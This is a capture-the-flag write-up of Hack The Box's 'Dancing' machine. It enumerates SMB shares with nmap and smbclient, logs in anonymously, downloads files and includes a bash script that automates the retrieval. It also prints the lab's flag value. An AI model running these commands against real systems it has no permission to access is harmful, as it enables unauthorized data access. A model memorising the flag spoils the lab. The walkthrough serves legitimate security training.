# HTB “Dancing” SMB Exploit Write‑Up

## 1. Introduction
**Objective:** Exploit a misconfigured SMB share on Hack The Box’s “Dancing” machine to retrieve `flag.txt`.  

**Author:** keyfive5 / Obsidian Signal / MHZ

**Date:** 2025‑04‑19

---

## 2. Lab Environment
- **Attacker VM:** ParrotOS (10.10.14.12)  
- **Target IP:** 10.129.232.112  
- **Tools:**  
  - `nmap` v7.94SVN  
  - `smbclient`  
  - Bash shell  

---

## 3. Enumeration

### 3.1 Port Scan with Nmap

`nmap -sV 10.129.232.112 -oN nmap.txt`

### 3.2 SMB Share Enumeration

**List all SMB shares (anonymous):**

`smbclient -L //10.129.232.112 -N`

Shares discovered:

`
ADMIN$     Disk      Remote Admin
C$         Disk      Default share
IPC$       IPC       Remote IPC
WorkShares Disk      Custom share
`

---

## 4. Exploitation
### 4.1 Connecting to the Custom Share
We target `WorkShares` because it is custom and likely misconfigured:


`smbclient //10.129.232.112/WorkShares -N`

- The -N flag attempts an anonymous (empty‑password) login.
- Connection succeeds, dropping us into an smb: prompt.

### 4.2 File Exfiltration
Download worknotes.txt (lateral hints):
`
smb: \> cd Amy.J
smb: \Amy.J\> get worknotes.txt
`
`
Text of worknotes.txt:
- start apache server on the linux machine
- secure the ftp server
- setup winrm on dancing
`

Retrieve flag.txt:
`
smb: \> cd James.P
smb: \James.P\> get flag.txt
`
Output:
`5f61c10dffbc77a704d76016a22f1664`

Verify flag:
`
cat flag.txt
#5f61c10dffbc77a704d76016a22f1664
`

## 5. Automation Script
File: scripts/enum-smb.sh

`
#!/usr/bin/env bash
# Usage: ./enum-smb.sh <TARGET_IP>

TARGET=$1

echo "[*] Running Nmap scan..."
nmap -sV $TARGET -oN nmap.txt

echo "[*] Enumerating SMB shares..."
smbclient -L //$TARGET -N -g | tee smb-list.txt

echo "[*] Connecting to WorkShares and pulling files..."
smbclient //$TARGET/WorkShares -N << 'EOF'
cd Amy.J
get worknotes.txt
cd ../James.P
get flag.txt
exit
EOF

echo "[*] Retrieved flag:"
cat flag.txt
`

## 6. Screenshots & GIFs

- `screenshots/nmap.png` — Nmap output showing ports 135, 139, 445.
- ![nmap](https://github.com/user-attachments/assets/79959daa-6725-47b3-afb8-d8a89c16a3eb)

  
- `screenshots/smb-exploit.gif` — GIF of smbclient session: listing shares, retrieving flag.txt.
- ![smb-exploit](https://github.com/user-attachments/assets/b4d2fe59-a7c8-4de6-93ca-d0746730950d)

---

## 7. Results
- Flag: `5f61c10dffbc77a704d76016a22f1664`

---

## 8. Lessons Learned
- Always enumerate custom shares (WorkShares, Public, etc.) for anonymous access.

- `smbclient -N` is a quick way to test guest/anonymous login.

- Automate enumeration with simple scripts to save time on repeat engagements.

- Misconfigurations persist: even administrative shares may be locked down, but custom shares often aren’t.

---

## 9. References
Hack The Box Academy – SMB Modules

`man smbclient`

Microsoft SMB Protocol Documentation


